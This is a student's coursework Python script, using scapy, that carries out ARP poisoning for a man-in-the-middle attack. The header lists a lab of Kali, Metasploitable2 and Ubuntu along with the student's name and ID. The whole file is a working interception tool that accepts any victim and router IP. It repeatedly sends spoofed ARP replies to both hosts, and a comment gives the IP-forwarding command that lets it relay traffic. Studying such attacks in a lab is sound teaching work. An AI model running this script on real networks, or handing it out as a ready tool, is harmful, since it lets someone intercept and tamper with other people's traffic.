# Student name: Edward Wagstaffe
# UOW ID: 8762697
# ARP poisoning
# CSCI369 - Assignment (Task 1)
# Script to perform ARP spoofing for man-in-the-middle attack simulation.
# Machines used:
# - Kali Linux (Attacker)
# - Metasploitable2 (Victim)
# - Ubuntu (Router)

# to enable port forwarding:
# echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward


#!/usr/bin/env python3
from scapy.all import *
import time
import sys

# Get MAC address for a given IP
def get_mac(ip, iface):
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                 timeout=2, iface=iface, verbose=False)
    return ans[0][1].src if ans else None

# Send spoofed ARP packet
def spoof(target_ip, target_mac, spoof_ip, iface):
    sendp(Ether(dst=target_mac)/ARP(op="is-at",
          pdst=target_ip, hwdst=target_mac, psrc=spoof_ip),
          iface=iface, verbose=False)

# Restore ARP tables
def restore(target_ip, target_mac, spoof_ip, spoof_mac, iface):
    sendp(Ether(dst=target_mac)/ARP(op="is-at",
          pdst=target_ip, hwdst=target_mac,
          psrc=spoof_ip, hwsrc=spoof_mac),
          iface=iface, count=10, verbose=False)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: sudo python3 arp_spoof.py <victim_ip> <router_ip>")
        sys.exit(1) # exit properly if usage incorrect

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]

    interface = conf.iface #automatically get the interface.

    # Get MAC addresses
    victim_mac = get_mac(victim_ip, interface)
    router_mac = get_mac(router_ip, interface)

    if not victim_mac or not router_mac:
        print("Error: Could not get MAC addresses")
        sys.exit(1) # exit properly if could not get MAC

    try:
        print("ARP spoofing started...")
        print("Press Ctrl+C to stop and restore ARP tables")
        
        while True:
            spoof(victim_ip, victim_mac, router_ip, interface) # tell victim we are router 
            spoof(router_ip, router_mac, victim_ip, interface) # tell router we are victim
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\nRestoring ARP tables...")
        restore(victim_ip, victim_mac, router_ip, router_mac, interface)
        restore(router_ip, router_mac, victim_ip, victim_mac, interface)
        print("ARP spoofing stopped")

